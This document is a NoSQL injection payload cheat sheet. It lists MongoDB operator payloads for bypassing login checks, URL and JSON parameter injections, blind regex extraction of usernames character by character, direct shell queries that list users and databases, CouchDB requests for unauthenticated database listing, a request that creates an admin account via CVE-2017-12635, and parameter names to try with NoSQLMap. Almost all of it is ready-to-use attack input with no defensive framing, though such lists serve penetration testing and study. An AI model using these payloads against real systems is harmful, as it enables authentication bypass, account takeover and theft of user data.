# NoSQL Injection Payloads

## MongoDB Operator Injection

```json
// Authentication bypass — password field
{"$ne": null}
{"$ne": "invalidvalue"}
{"$gt": ""}
{"$gte": ""}
{"$lt": "zzzzz"}
{"$regex": ".*"}
{"$in": ["admin", "user", "root"]}

// Server-side JS (requires $where enabled)
{"$where": "1==1"}
{"$where": "this.password.length > 0"}
{"$where": "function() { return true; }"}
```

## URL Parameter Injection

```
# PHP-style array → MongoDB operator
GET /api?user[$ne]=invalid&pass[$ne]=invalid

# JSON body with operator
POST /api/login
{"username": {"$regex": "admin.*"}, "password": {"$ne": "x"}}

# Nested operator
{"user": {"$or": [{"name": "admin"}, {"name": "root"}]}}
```

## Payloads by Attack Goal

### Auth Bypass

```
# Most common
username=admin&password[$ne]=wrongpassword
username[$ne]=invalid&password[$ne]=invalid
username=admin&password[$gt]=
username[$regex]=.*&password[$regex]=.*
```

### Data Extraction (Blind Boolean)

```python
# Extract username character by character
# Iterate a-z0-9 until response changes
{"username": {"$regex": "^a"}}   # Does username start with 'a'?
{"username": {"$regex": "^ad"}}  # Does username start with 'ad'?
{"username": {"$regex": "^adm"}} # ...
```

### MongoDB Shell Injection (Direct)

```javascript
// If MongoDB shell is directly accessible
db.users.find({username: {$ne: null}})
db.users.find({password: {$regex: ".*"}})
db.system.users.find()  // List all users
db.adminCommand({listDatabases: 1})
```

## CouchDB Injection

```
# Unauthenticated access
http://target.com:5984/_all_dbs
http://target.com:5984/DATABASE/_all_docs

# Admin creation (CVE-2017-12635)
PUT http://target.com:5984/_users/org.couchdb.user:attacker
{"name":"attacker","password":"password","roles":["_admin"],"type":"user"}
```

## Filters for nosqlmap

In NoSQLMap interactive mode, useful parameter names to try:
- `username`, `user`, `email`, `login`
- `password`, `pass`, `pwd`, `passwd`
- `id`, `_id`, `userId`
- `token`, `session`, `auth`
